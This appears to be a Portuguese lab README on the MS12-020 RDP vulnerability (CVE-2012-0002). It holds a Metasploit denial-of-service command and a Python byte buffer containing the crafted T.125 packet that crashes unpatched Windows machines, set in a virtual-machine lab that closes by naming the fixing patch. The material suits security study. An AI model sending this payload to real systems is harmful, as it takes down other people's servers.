# Exploring-MS12-020 / CVE-2012-0002

***"The Microsoft Remote Desktop Protocol (RDP) provides remote display
and input capabilities over network connections for Windows-based
applications running on a server. RDP is designed to support different
types of network topologies and multiple LAN protocols."***

 - O RDP é usado pelo "Terminal Services e Remote Desktop Services" e
   funciona no nível de kernel na porta 3389.
   
  - Existe uma vulnerabilidade que ocorre no manuseio do apontador
   pendente no campo maxChannelsIds do pacote T.125 ConnectMCSPDU que
   fica nesse estado de vulnerabilidade quando setado para menor/igual ao número 5.
   
  - Observe que nas versões do Windows pós-Vista (como 7 e 2008) "parece"
   necessário ter "Permitir conexões de computadores executando qualquer
   versão da área de trabalho remota "por ser vulnerável.
   
   - A code-exec ocorre durante a desconexão usuário. A capacidade de
   exploração depende da possibilidade de controlar o ESI ou o conteúdo
   apontado por ele.

![](https://ifconfig.dk/wp-content/uploads/2014/02/RDPkill1.png)

# Metasploit 

```console
root@kali# msfconsole

msf5 > use auxiliary/dos/windows/rdp/ms12_020_maxchannelids
msf5 auxiliary(dos/windows/rdp/ms12_020_maxchannelids) > set RHOSTS 192.168.X.X
msf5 auxiliary(dos/windows/rdp/ms12_020_maxchannelids) > run
```

A máquina Windows será paralisada, causando a famosa "TELA AZUL DA MORTE"

# Instalações
Para entender como criar e instalar uma VM com o SO - Win 7, recomendo acessar o seguinte link: [https://www.comoinstalar.com.br/virtualizacao/como-instalar-o-windows-7/](https://www.comoinstalar.com.br/virtualizacao/como-instalar-o-windows-7/) 

E para fazer a instalação do VirtualBox :
[https://www.virtualbox.org/wiki/Downloads](https://www.virtualbox.org/wiki/Downloads) 


# Código

O buffer que deve ser adicionado é o seguinte:

```python
import socket
import sys


buf=""
buf+="\x03\x00\x00\x13" # TPKT, Version 3, lenght 19
buf+="\x0e\xe0\x00\x00\x00\x00\x00\x01\x00\x08\x00\x00\x00\x00\x00" # ITU-T Rec X.224
buf+="\x03\x00\x01\xd6" # TPKT, Version 3, lenght 470
buf+="\x02\xf0\x80" # ITU-T Rec X.224
buf+="\x7f\x65\x82\x01\x94\x04" #MULTIPOINT-COMMUNICATION-SERVICE T.125

buf+="\x01\x01\x04\x01\x01\x01\x01\xff" 
buf+="\x30\x19\x02\x04\x00\x00\x00\x00"
buf+="\x02\x04\x00\x00\x00\x02\x02\x04"
buf+="\x00\x00\x00\x00\x02\x04\x00\x00"
buf+="\x00\x01\x02\x04\x00\x00\x00\x00"
buf+="\x02\x04\x00\x00\x00\x01\x02\x02"
buf+="\xff\xff\x02\x04\x00\x00\x00\x02"
buf+="\x30\x19\x02\x04\x00\x00\x00\x01"
buf+="\x02\x04\x00\x00\x00\x01\x02\x04"
buf+="\x00\x00\x00\x01\x02\x04\x00\x00"
buf+="\x00\x01\x02\x04\x00\x00\x00\x00"
buf+="\x02\x04\x00\x00\x00\x01\x02\x02"
buf+="\x04\x20\x02\x04\x00\x00\x00\x02"
buf+="\x30\x1c\x02\x02\xff\xff\x02\x02"
buf+="\xfc\x17\x02\x02\xff\xff\x02\x04"
buf+="\x00\x00\x00\x01\x02\x04\x00\x00"
buf+="\x00\x00\x02\x04\x00\x00\x00\x01"
buf+="\x02\x02\xff\xff\x02\x04\x00\x00"
buf+="\x00\x02\x04\x82\x01\x33\x00\x05"
buf+="\x00\x14\x7c\x00\x01\x81\x2a\x00"
buf+="\x08\x00\x10\x00\x01\xc0\x00\x44"
buf+="\x75\x63\x61\x81\x1c\x01\xc0\xd8"
buf+="\x00\x04\x00\x08\x00\x80\x02\xe0"
buf+="\x01\x01\xca\x03\xaa\x09\x04\x00"
buf+="\x00\xce\x0e\x00\x00\x48\x00\x4f"
buf+="\x00\x53\x00\x54\x00\x00\x00\x00"
buf+="\x00\x00\x00\x00\x00\x00\x00\x00"
buf+="\x00\x00\x00\x00\x00\x00\x00\x00"
buf+="\x00\x00\x00\x00\x00\x04\x00\x00"
buf+="\x00\x00\x00\x00\x00\x0c\x00\x00"
buf+="\x00\x00\x00\x00\x00\x00\x00\x00"
buf+="\x00\x00\x00\x00\x00\x00\x00\x00"
buf+="\x00\x00\x00\x00\x00\x00\x00\x00"
buf+="\x00\x00\x00\x00\x00\x00\x00\x00"
buf+="\x00\x00\x00\x00\x00\x00\x00\x00"
buf+="\x00\x00\x00\x00\x00\x00\x00\x00"
buf+="\x00\x00\x00\x00\x00\x00\x00\x00"
buf+="\x00\x00\x00\x00\x00\x00\x00\x00"
buf+="\x00\x01\xca\x01\x00\x00\x00\x00"
buf+="\x00\x10\x00\x07\x00\x01\x00\x30"
buf+="\x00\x30\x00\x30\x00\x30\x00\x30"
buf+="\x00\x2d\x00\x30\x00\x30\x00\x30"
buf+="\x00\x2d\x00\x30\x00\x30\x00\x30"
buf+="\x00\x30\x00\x30\x00\x30\x00\x30"
buf+="\x00\x2d\x00\x30\x00\x30\x00\x30"
buf+="\x00\x30\x00\x30\x00\x00\x00\x00"
buf+="\x00\x00\x00\x00\x00\x00\x00\x00"
buf+="\x00\x00\x00\x00\x00\x00\x00\x00"
buf+="\x00\x00\x00\x00\x00\x04\xc0\x0c"
buf+="\x00\x0d\x00\x00\x00\x00\x00\x00"
buf+="\x00\x02\xc0\x0c\x00\x1b\x00\x00"
buf+="\x00\x00\x00\x00\x00\x03\xc0\x2c"
buf+="\x00\x03\x00\x00\x00\x72\x64\x70"
buf+="\x64\x72\x00\x00\x00\x00\x00\x80"
buf+="\x80\x63\x6c\x69\x70\x72\x64\x72"
buf+="\x00\x00\x00\xa0\xc0\x72\x64\x70"
buf+="\x73\x6e\x64\x00\x00\x00\x00\x00"
buf+="\xc0"

buf+="\x03\x00\x00\x0c" # TPKT, Version 3, Lenght 12
buf+="\x02\xf0\x80"  # ITU-T Rec X.224
buf+="\x04\x01\x00\x01\x00" # MULTIPOINT-COMMUNICATION-SERVICE T.125
buf+="\x03\x00\x00\x08" #TPKT, Version 3, Length 8
buf+="\x02\xf0\x80" # ITU-T Rec X.224
buf+="\x28" # MULTIPOINT-COMM-SERVICE T.125
buf+="\x03\x00\x00\x0c" # TPKT, Version 3, Lenght 12
buf+="\x02\xf0\x80" # ITU-T Rec X.224
buf+="\x38\x00\x06\x03\xef" # MULTIPOINT-COMM-SERVICE T.125
buf+="\x03\x00\x00\x0c" # TPKT, Version 3, Lenght 12
buf+="\x02\xf0\x80" #ITU-T Rec X.224
buf+="\x38\x00\x06\x03\xeb" # MULTIPOINT-COMM-SERVICE T.125
buf+="\x03\x00\x00\x0c" # TPKT, Version 3, Lenght 12
buf+="\x02\xf0\x80" #ITU-T Rec X.224
buf+="\x38\x00\x06\x03\xec"# MULTIPOINT-COMM-SERVICE T.125
buf+="\x03\x00\x00\x0c"  # TPKT, Version 3, Lenght 12
buf+="\x02\xf0\x80" #ITU-T Rec X.224
buf+="\x38\x00\x06\x03\xed"# MULTIPOINT-COMM-SERVICE T.125
buf+="\x03\x00\x00\x0c" # TPKT, Version 3, Lenght 12
buf+="\x02\xf0\x80" #ITU-T Rec X.224
buf+="\x38\x00\x06\x03\xee"# MULTIPOINT-COMM-SERVICE T.125
buf+="\x03\x00\x00\x0b" # TPKT, Version 3, Lenght 12
buf+="\x06\xd0\x00\x00\x12\x34\x00"  #ITU-T Rec X.224

```
Por fim, a instalação da atualização de segurança KB2621440 através da atualização do Windows fecha esta vulnerabilidade. Com isso, espero que prove meu ponto de sempre manter seu sistema atualizado.
